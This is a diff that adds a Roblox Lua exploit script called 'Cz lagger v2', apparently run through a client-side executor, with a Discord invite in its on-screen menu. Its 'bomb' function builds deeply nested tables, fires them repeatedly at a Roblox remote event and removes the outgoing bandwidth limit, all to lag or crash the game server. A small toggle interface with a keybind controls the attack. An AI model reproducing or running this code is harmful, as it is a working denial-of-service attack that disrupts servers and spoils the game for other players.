@@ -1,0 +1,303 @@
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+
+----------------------------------------------------------------
+-- LAGGER LOGIC SECTION
+----------------------------------------------------------------
+local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+local LAGGER_CONFIG = isMobile and {TableIncrease = 290, Tries = 1, LoopWaitTime = 0.85} or {TableIncrease = 265, Tries = 1, LoopWaitTime = 0.05}
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+local CONFIG_FILE_NAME = "voidxhub-lagger.config"
+
+-- Purple Color Helper
+local function getPurpleSequence()
+    return ColorSequence.new({
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 0, 255)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(60, 0, 150)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(120, 0, 255))
+    })
+end
+
+local function loadConfig()
+    local success, data = pcall(function() return readfile(CONFIG_FILE_NAME) end)
+    if success and data then
+        local decoded = HttpService:JSONDecode(data)
+        if decoded and decoded.boundKey then return decoded.boundKey end
+    end
+    return nil
+end
+
+local function saveConfig(boundKey)
+    local data = HttpService:JSONEncode({boundKey = boundKey})
+    pcall(function() writefile(CONFIG_FILE_NAME, data) end)
+end
+
+local function resolveRemote(path)
+    if not path or path == "" then return nil end
+    local obj = game
+    local cleaned = path:gsub("^game%.", "")
+    for segment in cleaned:gmatch("[^%.]+") do
+        if obj then obj = obj[segment] else return nil end
+    end
+    return obj
+end
+
+local function bomb(tableincrease, tries)
+    local maintable = {}
+    local spammedtable = {{}}
+    local z = spammedtable[1]
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maximum = (499999 / (tableincrease + 2)) or 9999999
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 5000 == 0 then task.wait() end
+    end
+    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+    if remote then
+        for i = 1, tries do
+            pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+        end
+    end
+end
+
+local laggerEnabled = false
+local laggerThread = nil
+
+local function startLaggerLoop()
+    while laggerEnabled do
+        game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+        task.spawn(function() bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries) end)
+        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+    end
+end
+
+local function stopLaggerLoop()
+    laggerEnabled = false
+    if laggerThread then coroutine.close(laggerThread); laggerThread = nil end
+end
+
+local function startLagger()
+    if laggerThread then return end
+    laggerEnabled = true
+    laggerThread = coroutine.create(startLaggerLoop)
+    coroutine.resume(laggerThread)
+end
+
+----------------------------------------------------------------
+-- MAIN UI CONSTRUCT (Cz lagger v2)
+----------------------------------------------------------------
+local function loadMainUI()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "CzLaggerUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.Parent = CoreGui
+
+    local Frame = Instance.new("Frame")
+    Frame.BackgroundTransparency = 0.15
+    Frame.Position = UDim2.new(0, 30, 0, 137)
+    Frame.ClipsDescendants = true
+    Frame.Active = true
+    Frame.BackgroundColor3 = Color3.fromRGB(10, 5, 15)
+    Frame.Size = UDim2.new(0, 200, 0, 125)
+    Frame.Parent = ScreenGui
+
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 10)
+    UICorner.Parent = Frame
+
+    local UIStroke = Instance.new("UIStroke")
+    UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    UIStroke.Thickness = 2.5
+    UIStroke.Color = Color3.new(1, 1, 1)
+    UIStroke.Parent = Frame
+
+    local Gradient = Instance.new("UIGradient")
+    Gradient.Color = getPurpleSequence()
+    Gradient.Parent = UIStroke
+
+    task.spawn(function()
+        while task.wait() do Gradient.Rotation = (Gradient.Rotation + 1.5) % 360 end
+    end)
+
+    -- Title: Cz lagger v2
+    local TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Font = Enum.Font.GothamBlack
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Position = UDim2.new(0, 10, 0, 5)
+    TitleLabel.TextColor3 = Color3.new(1, 1, 1)
+    TitleLabel.Text = "Cz lagger v2"
+    TitleLabel.TextSize = 16
+    TitleLabel.Size = UDim2.new(1, -20, 0, 20)
+    TitleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    TitleLabel.Parent = Frame
+
+    local TitleGrad = Instance.new("UIGradient")
+    TitleGrad.Color = getPurpleSequence()
+    TitleGrad.Parent = TitleLabel
+    task.spawn(function()
+        while task.wait() do TitleGrad.Rotation = (TitleGrad.Rotation + 2) % 360 end
+    end)
+
+    -- Discord link under title
+    local DiscordLabel = Instance.new("TextLabel")
+    DiscordLabel.Font = Enum.Font.GothamSemibold
+    DiscordLabel.BackgroundTransparency = 1
+    DiscordLabel.Position = UDim2.new(0, 10, 0, 27)
+    DiscordLabel.TextColor3 = Color3.fromRGB(180, 100, 255)
+    DiscordLabel.Text = "discord.gg/p3E77CCeJE"
+    DiscordLabel.TextSize = 12
+    DiscordLabel.Size = UDim2.new(1, -20, 0, 16)
+    DiscordLabel.TextXAlignment = Enum.TextXAlignment.Left
+    DiscordLabel.Parent = Frame
+
+    -- Status row (click to toggle)
+    local StatusRow = Instance.new("Frame")
+    StatusRow.Position = UDim2.new(0, 10, 0, 48)
+    StatusRow.BackgroundColor3 = Color3.fromRGB(20, 15, 25)
+    StatusRow.Size = UDim2.new(1, -20, 0, 30)
+    StatusRow.Parent = Frame
+    Instance.new("UICorner", StatusRow)
+
+    local StatusStroke = Instance.new("UIStroke", StatusRow)
+    StatusStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    StatusStroke.Thickness = 1
+    local StatusGrad = Instance.new("UIGradient", StatusStroke)
+    StatusGrad.Color = getPurpleSequence()
+    task.spawn(function() while task.wait() do StatusGrad.Rotation = (StatusGrad.Rotation + 1) % 360 end end)
+
+    local StatusLabel = Instance.new("TextButton")
+    StatusLabel.BackgroundTransparency = 1
+    StatusLabel.TextColor3 = Color3.new(1, 1, 1)
+    StatusLabel.Font = Enum.Font.GothamBlack
+    StatusLabel.Text = "LAGGER: OFF"
+    StatusLabel.Size = UDim2.new(1, 0, 1, 0)
+    StatusLabel.Position = UDim2.new(0, 0, 0, 0)
+    StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
+    StatusLabel.Parent = StatusRow
+
+    -- Keybind row
+    local KeyRow = Instance.new("Frame")
+    KeyRow.Position = UDim2.new(0, 10, 0, 83)
+    KeyRow.BackgroundColor3 = Color3.fromRGB(20, 15, 25)
+    KeyRow.Size = UDim2.new(1, -20, 0, 24)
+    KeyRow.Parent = Frame
+    Instance.new("UICorner", KeyRow)
+
+    local KeyStroke = Instance.new("UIStroke", KeyRow)
+    KeyStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+    KeyStroke.Thickness = 1
+    local KeyGrad = Instance.new("UIGradient", KeyStroke)
+    KeyGrad.Color = getPurpleSequence()
+    task.spawn(function() while task.wait() do KeyGrad.Rotation = (KeyGrad.Rotation + 1) % 360 end end)
+
+    local KeyLabel = Instance.new("TextLabel")
+    KeyLabel.BackgroundTransparency = 1
+    KeyLabel.TextColor3 = Color3.new(1, 1, 1)
+    KeyLabel.Font = Enum.Font.GothamBlack
+    KeyLabel.Text = "Keybind"
+    KeyLabel.Size = UDim2.new(0.5, 0, 1, 0)
+    KeyLabel.Position = UDim2.new(0, 10, 0, 0)
+    KeyLabel.TextXAlignment = Enum.TextXAlignment.Left
+    KeyLabel.Parent = KeyRow
+
+    local KeyBtn = Instance.new("TextButton")
+    KeyBtn.Size = UDim2.new(0, 60, 0, 18)
+    KeyBtn.Position = UDim2.new(1, -68, 0.5, -9)
+    KeyBtn.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
+    KeyBtn.TextColor3 = Color3.fromRGB(200, 150, 255)
+    KeyBtn.Font = Enum.Font.GothamBlack
+    KeyBtn.TextSize = 10
+    KeyBtn.Text = "[ V ]"
+    KeyBtn.Parent = KeyRow
+    Instance.new("UICorner", KeyBtn).CornerRadius = UDim.new(0, 5)
+
+    -- Interaction Logic
+    local function setToggle(state)
+        laggerEnabled = state
+        StatusLabel.Text = state and "LAGGER: ON" or "LAGGER: OFF"
+        if state then startLagger() else stopLaggerLoop() end
+    end
+
+    StatusLabel.MouseButton1Click:Connect(function()
+        setToggle(not laggerEnabled)
+    end)
+
+    -- Keybind handling
+    local boundKey = nil
+    local listening = false
+    local saved = loadConfig()
+    if saved then
+        boundKey = saved
+        KeyBtn.Text = "[ " .. tostring(saved):sub(14) .. " ]"
+    else
+        boundKey = Enum.KeyCode.V
+        KeyBtn.Text = "[ V ]"
+        saveConfig(boundKey)
+    end
+
+    KeyBtn.MouseButton1Click:Connect(function()
+        listening = true
+        KeyBtn.Text = "[ ... ]"
+    end)
+
+    UserInputService.InputBegan:Connect(function(input, gpe)
+        if gpe then return end
+        if listening then
+            if input.UserInputType == Enum.UserInputType.Keyboard then
+                boundKey = input.KeyCode
+                KeyBtn.Text = "[ " .. tostring(input.KeyCode):sub(14) .. " ]"
+                listening = false
+                saveConfig(boundKey)
+            end
+        elseif boundKey and input.KeyCode == boundKey then
+            setToggle(not laggerEnabled)
+        end
+    end)
+
+    -- Dragging
+    local dragging, dragStart, startPos
+    Frame.InputBegan:Connect(function(input)
+        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
+            dragging = true; dragStart = input.Position; startPos = Frame.Position
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    UserInputService.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
+    end)
+end
+
+----------------------------------------------------------------
+-- EXECUTION START
+----------------------------------------------------------------
+-- Remove textures/decals and change materials
+for _, v in pairs(workspace:GetDescendants()) do
+    if v:IsA("Texture") or v:IsA("Decal") then v:Destroy()
+    elseif v:IsA("Part") and v.Material ~= Enum.Material.Neon and v.Material ~= Enum.Material.ForceField then
+        v.Material = Enum.Material.SmoothPlastic
+    end
+end
+
+-- Load UI directly (no intro)
+loadMainUI()
